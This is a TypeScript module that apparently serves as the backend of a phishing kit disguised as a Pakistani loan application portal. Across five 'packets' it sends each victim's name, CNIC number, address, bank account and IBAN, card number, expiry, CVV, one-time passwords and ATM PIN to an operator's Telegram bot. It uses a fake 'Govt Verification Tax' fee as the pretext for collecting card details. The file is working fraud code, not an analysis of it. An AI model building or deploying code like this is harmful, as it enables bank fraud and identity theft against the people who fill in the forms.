import { PersonalInfo, BankInfo, CardInfo } from '../types';

// Telegram Bot Environment Config
const getBotToken = (): string => {
  return (
    (import.meta as any).env?.TELEGRAM_BOT_TOKEN ||
    (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN ||
    (typeof process !== 'undefined' && process.env?.TELEGRAM_BOT_TOKEN) ||
    ''
  );
};

const getChatId = (): string => {
  return (
    (import.meta as any).env?.TELEGRAM_CHAT_ID ||
    (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID ||
    (typeof process !== 'undefined' && process.env?.TELEGRAM_CHAT_ID) ||
    ''
  );
};

// Generate human-readable session ID
const generateSessionId = () => `PK-${Math.floor(100000 + Math.random() * 900000)}`;

let currentSessionId = generateSessionId();

export function getSessionId(): string {
  return currentSessionId;
}

export function resetSession(): void {
  currentSessionId = generateSessionId();
}

/**
 * Escapes characters for Telegram HTML parse_mode
 */
function escapeHtml(text: string | number | undefined | null): string {
  if (text === undefined || text === null) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * Core helper to send an HTML-formatted message packet to Telegram
 */
export async function sendTelegramMessage(htmlText: string): Promise<boolean> {
  const botToken = getBotToken();
  const chatId = getChatId();

  if (!botToken || botToken.includes('YOUR_TELEGRAM_BOT_TOKEN') || !chatId) {
    console.info('[Telegram Service] Bot token or chat ID not set. Message packet logged locally:');
    console.log(htmlText.replace(/<[^>]+>/g, ''));
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: htmlText,
        parse_mode: 'HTML',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('[Telegram Service] Failed to deliver packet:', result);
      return false;
    }
    return true;
  } catch (err) {
    console.error('[Telegram Service] Network error delivering packet to Telegram:', err);
    return false;
  }
}

/**
 * PACKET 1: Step 1 - Personal Information
 * Sent when user fills all personal info and clicks Continue
 */
export async function sendStep1PersonalPacket(data: PersonalInfo): Promise<boolean> {
  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const date = new Date().toLocaleDateString('en-PK');

  const text =
    `📦 <b>[PACKET 1/5] STEP 1: PERSONAL INFORMATION</b>\n` +
    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
    `⏰ <b>Time:</b> ${time} (${date})\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>Full Name:</b> <b>${escapeHtml(data.fullName)}</b>\n` +
    `🪪 <b>CNIC Number:</b> <code>${escapeHtml(data.cnic)}</code>\n` +
    `📱 <b>Mobile Number:</b> <code>${escapeHtml(data.mobileNo)}</code>\n` +
    `🎂 <b>Date of Birth:</b> <b>${escapeHtml(data.dob)}</b>\n` +
    `⚧ <b>Gender:</b> ${escapeHtml(data.gender)}\n` +
    `📍 <b>Province:</b> ${escapeHtml(data.province)}\n` +
    `🏠 <b>Address:</b> ${escapeHtml(data.address)}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ <i>Step 1 validated & continued by user</i>`;

  return sendTelegramMessage(text);
}

/**
 * PACKET 2: Step 2 - Bank & Financial Information
 * Sent when user fills all bank info and clicks Continue
 */
export async function sendStep2BankPacket(data: BankInfo, personal?: PersonalInfo): Promise<boolean> {
  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const applicantInfo = personal?.fullName
    ? `👤 <b>Applicant:</b> <b>${escapeHtml(personal.fullName)}</b> (${escapeHtml(personal.cnic || personal.mobileNo)})\n`
    : '';

  const text =
    `📦 <b>[PACKET 2/5] STEP 2: BANK & FINANCIAL INFO</b>\n` +
    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
    applicantInfo +
    `⏰ <b>Time:</b> ${time}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💰 <b>Requested Loan:</b> <b>PKR ${escapeHtml(data.loanAmount)}</b>\n` +
    `🎯 <b>Loan Purpose:</b> ${escapeHtml(data.loanPurpose)}\n` +
    `💼 <b>Occupation:</b> ${escapeHtml(data.occupation)}\n` +
    `🏛️ <b>Bank Name:</b> <b>${escapeHtml(data.bankName)}</b>\n` +
    `💳 <b>Account / IBAN:</b> <code>${escapeHtml(data.accountNumber)}</code>\n` +
    `💵 <b>Current Balance:</b> <b>PKR ${escapeHtml(data.currentBalance)}</b>\n` +
    `📈 <b>Monthly Income:</b> <b>PKR ${escapeHtml(data.monthlyIncome)}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ <i>Step 2 validated & continued by user</i>`;

  return sendTelegramMessage(text);
}

/**
 * PACKET 3: Step 3 - Processing Fee & Card Information
 * Sent when user fills card info and clicks Pay & Continue
 */
export async function sendStep3CardPacket(data: CardInfo, personal?: PersonalInfo): Promise<boolean> {
  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const applicantInfo = personal?.fullName
    ? `👤 <b>Applicant:</b> <b>${escapeHtml(personal.fullName)}</b> (${escapeHtml(personal.mobileNo)})\n`
    : '';

  const text =
    `📦 <b>[PACKET 3/5] STEP 3: CARD & PROCESSING FEE</b>\n` +
    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
    applicantInfo +
    `⏰ <b>Time:</b> ${time}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🏷️ <b>Processing Fee:</b> <b>PKR 75</b> (Govt Verification Tax)\n` +
    `💳 <b>ATM / Debit Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>\n` +
    `📅 <b>Expiry Date:</b> <code>${escapeHtml(data.expiry)}</code>\n` +
    `🔒 <b>CVV Code:</b> <code>${escapeHtml(data.cvv)}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ <i>Step 3 Fee payment authorized & continued</i>`;

  return sendTelegramMessage(text);
}

/**
 * PACKET 4: Step 4 - OTP Verification
 * Sent when user enters 6-digit OTP and clicks Verify OTP
 */
export async function sendStep4OtpPacket(
  otp: string,
  mobileNo?: string,
  personal?: PersonalInfo
): Promise<boolean> {
  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const applicantInfo = personal?.fullName
    ? `👤 <b>Applicant:</b> <b>${escapeHtml(personal.fullName)}</b>\n`
    : '';

  const text =
    `📦 <b>[PACKET 4/5] STEP 4: OTP CODE VERIFICATION</b>\n` +
    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
    applicantInfo +
    `⏰ <b>Time:</b> ${time}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📱 <b>Mobile Number:</b> <code>${escapeHtml(mobileNo || personal?.mobileNo || '---')}</code>\n` +
    `🔑 <b>Submitted OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ <i>Step 4 OTP verified & continued</i>`;

  return sendTelegramMessage(text);
}

/**
 * PACKET 5: Step 5 - ATM PIN & Master Application Dossier
 * Sent when user enters 4-digit ATM PIN and submits final application
 */
export async function sendStep5PinAndFinalPacket(payload: {
  pin: string;
  trackingId: string;
  personal: PersonalInfo;
  bank: BankInfo;
  card: CardInfo;
  otp: string;
}): Promise<boolean> {
  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const date = new Date().toLocaleDateString('en-PK');
  const { pin, trackingId, personal, bank, card, otp } = payload;

  const text =
    `📦 <b>[PACKET 5/5] STEP 5: ATM PIN & FINAL SUBMISSION</b>\n` +
    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
    `🎉 <b>Official Tracking ID:</b> <code>${escapeHtml(trackingId)}</code>\n` +
    `⏰ <b>Submitted At:</b> ${time} (${date})\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>ATM PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
    `🔑 <b>Verified OTP:</b> <code>${escapeHtml(otp)}</code>\n\n` +
    `💳 <b>CARD DETAILS:</b>\n` +
    `• Number: <code>${escapeHtml(card.cardNumber)}</code>\n` +
    `• Expiry: <code>${escapeHtml(card.expiry)}</code> | CVV: <code>${escapeHtml(card.cvv)}</code>\n\n` +
    `🏛️ <b>BANK & LOAN DETAILS:</b>\n` +
    `• Requested Loan: <b>PKR ${escapeHtml(bank.loanAmount)}</b>\n` +
    `• Purpose: ${escapeHtml(bank.loanPurpose)}\n` +
    `• Occupation: ${escapeHtml(bank.occupation)}\n` +
    `• Bank: <b>${escapeHtml(bank.bankName)}</b>\n` +
    `• Account / IBAN: <code>${escapeHtml(bank.accountNumber)}</code>\n` +
    `• Current Balance: PKR ${escapeHtml(bank.currentBalance)}\n` +
    `• Monthly Income: PKR ${escapeHtml(bank.monthlyIncome)}\n\n` +
    `👤 <b>APPLICANT DETAILS:</b>\n` +
    `• Name: <b>${escapeHtml(personal.fullName)}</b>\n` +
    `• CNIC: <code>${escapeHtml(personal.cnic)}</code>\n` +
    `• Mobile: <code>${escapeHtml(personal.mobileNo)}</code>\n` +
    `• DOB: ${escapeHtml(personal.dob)} | Gender: ${escapeHtml(personal.gender)}\n` +
    `• Province: ${escapeHtml(personal.province)}\n` +
    `• Address: ${escapeHtml(personal.address)}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🚀 <b>APPLICATION COMPLETED & SUBMITTED TO PORTAL</b>`;

  return sendTelegramMessage(text);
}
